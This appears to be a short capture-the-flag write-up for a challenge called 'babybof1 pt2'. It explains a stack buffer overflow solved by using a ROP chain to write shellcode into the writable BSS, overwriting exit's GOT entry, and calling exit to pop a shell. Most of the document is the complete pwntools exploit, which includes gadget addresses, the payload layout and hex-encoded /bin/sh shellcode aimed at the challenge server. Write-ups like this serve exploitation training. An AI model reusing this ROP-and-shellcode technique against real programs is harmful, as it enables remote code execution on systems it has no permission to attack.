# babybof1 pt2 (444pts) #

![TASK](https://imgur.com/R5bo1k7.png)

It was a simple bufferoverflow where we are asked to pop a shell , first of all i tried ret2libc but idk why it didn't worked on the remote server,
so i decided to use ret2shellcode ( NX is disabled ) but we don't have a stack address ? i created firstly a ROP chain to write my shellcode in the BSS since it's RWX and then i overwrote the GOT entry of exit@got
with the address of my shellcode and finally i called exit => shellcode executed => Shell \o/ 

here is my final exploit:

```python
from pwn import *
p=remote("chals20.cybercastors.com",14425)
#p=process("./babybof")
p.recvuntil("name:")
#pause()
RET=p64(0x0000000000400566)
PUTS=p64(0x0000000000400590)
MAIN=p64(0x000000000040074d)
POP_RDI=p64(0x00000000004007f3)
GETS=p64(0x00000000004005d0)
payload=cyclic(264)
payload+=POP_RDI
payload+=p64(0x601070)
payload+=GETS
payload+=POP_RDI
payload+=p64(0x601050)
payload+=GETS
payload+=MAIN
p.sendline(payload)
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
p.sendline(shellcode)
p.sendline(p64(0x601070))
p.recvuntil("name:")
payload=cyclic(264)
payload+=RET
payload+=p64(0x00000000004005f0)
p.sendline(payload)
p.interactive()

```

If you have any questions you can DM on twitter @belkahlaahmed1 or visit my website for more interesting content and blogs https://ahmed-belkahla.me
